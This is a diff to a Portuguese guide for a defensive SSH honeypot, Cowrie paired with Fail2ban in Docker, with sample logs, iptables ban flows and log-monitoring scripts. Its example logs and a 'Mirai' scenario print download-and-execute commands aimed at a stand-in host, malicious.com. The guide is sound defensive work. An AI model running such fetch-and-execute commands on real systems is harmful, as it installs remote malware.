@@ -1,14 +1,14 @@
 # Guia Completo: Sistema Honeypot com Cowrie e Fail2ban
 
 ## 📋 Índice
-1. [Visão Geral do Sistema](#-visão-geral-do-sistema)
-2. [Arquitetura e Componentes](#️-arquitetura-e-componentes)
-3. [Cowrie Honeypot](#-cowrie-honeypot)
-4. [Fail2ban - Sistema de Proteção](#️-fail2ban---sistema-de-proteção)
-5. [Docker e Orquestração](#-docker-e-orquestração)
-6. [Fluxo de Funcionamento](#-fluxo-de-funcionamento)
-7. [Configurações Detalhadas](#️-configurações-detalhadas)
-8. [Comandos Úteis](#️-comandos-úteis)
+1. [Visão Geral do Sistema](#visão-geral-do-sistema)
+2. [Arquitetura e Componentes](#arquitetura-e-componentes)
+3. [Cowrie Honeypot](#cowrie-honeypot)
+4. [Fail2ban - Sistema de Proteção](#fail2ban---sistema-de-proteção)
+5. [Docker e Orquestração](#docker-e-orquestração)
+6. [Fluxo de Funcionamento](#fluxo-de-funcionamento)
+7. [Configurações Detalhadas](#configurações-detalhadas)
+8. [Comandos Úteis](#comandos-úteis)
 
 ---
 
@@ -88,6 +88,7 @@ honeypot:
     - "22:2222"  # Porta 22 do host → porta 2222 do container
   volumes:
     - cowrie-logs:/cowrie/cowrie-git/var/log/cowrie
+    - ./cowrie-config:/cowrie/cowrie-git/etc
   networks:
     - honeynet
 ```
@@ -107,7 +108,7 @@ honeypot:
   "eventid": "cowrie.command.input",
   "input": "wget http://malicious.com/botnet.sh",
   "message": "CMD: wget http://malicious.com/botnet.sh",
-  "src_ip": "127.0.0.1",
+  "src_ip": "177.189.177.165",
   "timestamp": "2025-11-16T21:07:26.395058Z",
   "sensor": "3a78002ba118",
   "uuid": "db5d015e-c2d0-11f0-adce-3e0817dacbfc"
@@ -120,6 +121,10 @@ honeypot:
 - `src_ip`: IP de origem do atacante
 - `timestamp`: Data/hora do evento
 - `message`: Mensagem descritiva do evento
+
+### Regras de acesso de usuarios
+
+O Docker projeta o arquivo userdb.txt do host diretamente no caminho de leitura padrão do Cowrie dentro do container, fazendo com que a aplicação adote suas regras de autenticação instantaneamente sem precisar recompilar a imagem.
 
 ---
 
@@ -268,7 +273,7 @@ networks:
 
 ### 1. Atacante Conecta
 ```
-Atacante (IP: 127.0.0.1)
+Atacante (IP: 177.189.177.165)
     │
     │ SSH na porta 22
     ▼
@@ -295,7 +300,7 @@ Log gerado em cowrie.json:
 {
   "eventid": "cowrie.command.input",
   "input": "wget http://malicious.com/botnet.sh",
-  "src_ip": "127.0.0.1",
+  "src_ip": "177.189.177.165",
   ...
 }
 ```
@@ -308,7 +313,7 @@ Fail2ban monitora cowrie.json em tempo real
     ▼
 Aplica regex do filtro malware-commands
     │
-    │ Regex encontra: wget + IP 127.0.0.1
+    │ Regex encontra: wget + IP 177.189.177.165
     ▼
 Conta como 1 falha
     │
@@ -319,11 +324,11 @@ Executa ação: docker-user
 
 ### 4. IP é Banido
 ```
-Fail2ban executa: iptables -I DOCKER-USER 1 -s 127.0.0.1 -j DROP
+Fail2ban executa: iptables -I DOCKER-USER 1 -s 177.189.177.165 -j DROP
     │
     ▼
 Regra adicionada no iptables:
-DROP all -- 127.0.0.1 anywhere
+DROP all -- 177.189.177.165 anywhere
     │
     ▼
 Próxima tentativa de conexão do IP é bloqueada
@@ -337,7 +342,7 @@ Atacante não consegue mais conectar
 Após bantime (24h)
     │
     ▼
-Fail2ban executa: iptables -D DOCKER-USER -s 127.0.0.1 -j DROP
+Fail2ban executa: iptables -D DOCKER-USER -s 177.189.177.165 -j DROP
     │
     ▼
 Regra removida do iptables
@@ -418,10 +423,10 @@ docker restart fail2ban_monitor
 
 ```bash
 # Desbanir um IP específico
-docker exec fail2ban_monitor fail2ban-client set malware-commands unbanip 127.0.0.1
+docker exec fail2ban_monitor fail2ban-client set malware-commands unbanip 177.189.177.165
 
 # Desbanir todos os IPs
-docker exec fail2ban_monitor fail2ban-client set malware-commands unbanall
+docker exec fail2ban_monitor fail2ban-client reload malware-commands
 
 # Ver IPs banidos
 docker exec fail2ban_monitor fail2ban-client status malware-commands | grep "Banned IP"
@@ -437,7 +442,7 @@ sudo iptables -L DOCKER-USER -n -v
 sudo iptables -L DOCKER-USER -n -v | grep DROP
 
 # Remover regra manualmente (se necessário)
-sudo iptables -D DOCKER-USER -s 127.0.0.1 -j DROP
+sudo iptables -D DOCKER-USER -s 177.189.177.165 -j DROP
 ```
 
 ### Logs e Monitoramento
@@ -456,6 +461,35 @@ docker exec cowrie_honeypot tail -50 /cowrie/cowrie-git/var/log/cowrie/cowrie.js
 docker logs fail2ban_monitor | grep -i "ban\|unban"
 ```
 
+### Demonstração em Tempo Real
+```bash
+# Ver logs do Cowrie com filtro para login
+docker compose logs -f honeypot | grep --line-buffered "login attempt" | sed -u -e 's/failed/\x1b[31mfailed\x1b[0m/' -e 's/succeeded/\x1b[32msucceeded\x1b[0m/'
+
+# Ver logs do Cowrie com filtro para Comandos Digitados
+docker compose logs -f honeypot | \
+grep --line-buffered "CMD:" | \
+awk '{
+  match($0, /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/); 
+  ip = substr($0, RSTART, RLENGTH); 
+  sub(/.*CMD: /, ""); 
+  print "\033[1;36m[ATACANTE IP: " ip "]\033[0m \033[1;35m DIGITOU > \033[0m" $0;
+  fflush();
+}'
+
+# Ver logs do fail2ban os IP's banidos
+docker logs -f fail2ban_monitor | \
+grep --line-buffered "\[malware-commands\]" | \
+grep --line-buffered "Ban" | \
+awk '{ 
+
+    for(i=1;i<=NF;i++) if($i ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) ip=$i;
+    
+    print "\033[1;41;37m [PERIGO] \033[0m \033[1;31mCOMMANDO DETECTADO\033[0m -> IP Banido: \033[1;33m" ip "\033[0m"
+    fflush();
+}'
+```
+
 ### Gerenciamento de Containers
 
 ```bash
@@ -463,13 +497,13 @@ docker logs fail2ban_monitor | grep -i "ban\|unban"
 docker ps
 
 # Parar todos os serviços
-docker-compose down
+docker compose down
 
 # Iniciar serviços
-docker-compose up -d
+docker compose up -d
 
 # Ver logs de todos os serviços
-docker-compose logs -f
+docker compose logs -f
 ```
 
 ### Teste do Sistema
@@ -489,3 +523,115 @@ docker exec fail2ban_monitor fail2ban-client status malware-commands
 # 5. Tentar conectar novamente (deve falhar)
 ssh root@SEU_SERVIDOR -p 22
 ```
+
+---
+
+## 🔍 Troubleshooting
+
+### Fail2ban não está banindo
+
+1. **Verificar se o jail está ativo:**
+   ```bash
+   docker exec fail2ban_monitor fail2ban-client status malware-commands
+   ```
+
+2. **Verificar se o arquivo de log existe:**
+   ```bash
+   docker exec fail2ban_monitor ls -la /var/log/cowrie/
+   ```
+
+3. **Verificar se a regex está correta:**
+   - Teste manualmente a regex contra uma linha de log
+   - Verifique a ordem dos campos no JSON
+
+4. **Verificar logs do fail2ban:**
+   ```bash
+   docker logs fail2ban_monitor | tail -50
+   ```
+
+### IP não está sendo banido
+
+1. **Verificar se está na lista ignoreip:**
+   ```bash
+   cat fail2ban-data/jail.d/malware-commands.local | grep ignoreip
+   ```
+
+2. **Verificar se o comando está na lista de detecção:**
+   - Verifique o filtro `malware-commands.conf`
+   - Adicione o comando se necessário
+
+3. **Verificar iptables:**
+   ```bash
+   sudo iptables -L DOCKER-USER -n -v
+   ```
+
+### Container não inicia
+
+1. **Verificar logs:**
+   ```bash
+   docker logs fail2ban_monitor
+   docker logs cowrie_honeypot
+   ```
+
+2. **Verificar permissões:**
+   - Fail2ban precisa de `NET_ADMIN` e `NET_RAW`
+   - Verifique se o docker-compose.yml está correto
+
+3. **Verificar portas:**
+   - Porta 22 não deve estar em uso por outro serviço
+   - Verifique: `sudo netstat -tulpn | grep :22`
+
+---
+
+## 📊 Exemplo de Uso Real
+
+### Cenário: Botnet Mirai
+
+1. **Atacante conecta:**
+   ```
+   ssh root@servidor -p 22
+   Login: root
+   Password: admin
+   ```
+
+2. **Executa comando típico do Mirai:**
+   ```bash
+   wget http://malicious.com/mirai.sh -O /tmp/mirai.sh
+   chmod +x /tmp/mirai.sh
+   /tmp/mirai.sh
+   ```
+
+3. **Cowrie registra:**
+   - 3 eventos de `cowrie.command.input`
+   - Todos com o mesmo `src_ip`
+
+4. **Fail2ban detecta:**
+   - Primeiro comando (`wget`) → 1 falha
+   - `maxretry = 1` → Bane imediatamente
+
+5. **Resultado:**
+   - IP banido antes de executar os outros comandos
+   - Proteção ativa funcionando
+
+---
+
+## 🎓 Conclusão
+
+Este sistema fornece:
+- ✅ **Coleta de inteligência** sobre ataques
+- ✅ **Proteção automática** contra atacantes
+- ✅ **Isolamento seguro** do honeypot
+- ✅ **Logs detalhados** para análise
+- ✅ **Fácil manutenção** via Docker
+
+**Lembre-se:**
+- Este é um honeypot - **não use em produção real**
+- Mantenha os logs seguros (podem conter informações sensíveis)
+- Monitore regularmente os IPs banidos
+- Ajuste os filtros conforme necessário
+
+---
+
+**Última atualização:** 2025-11-16
+**Versão:** 1.0
+
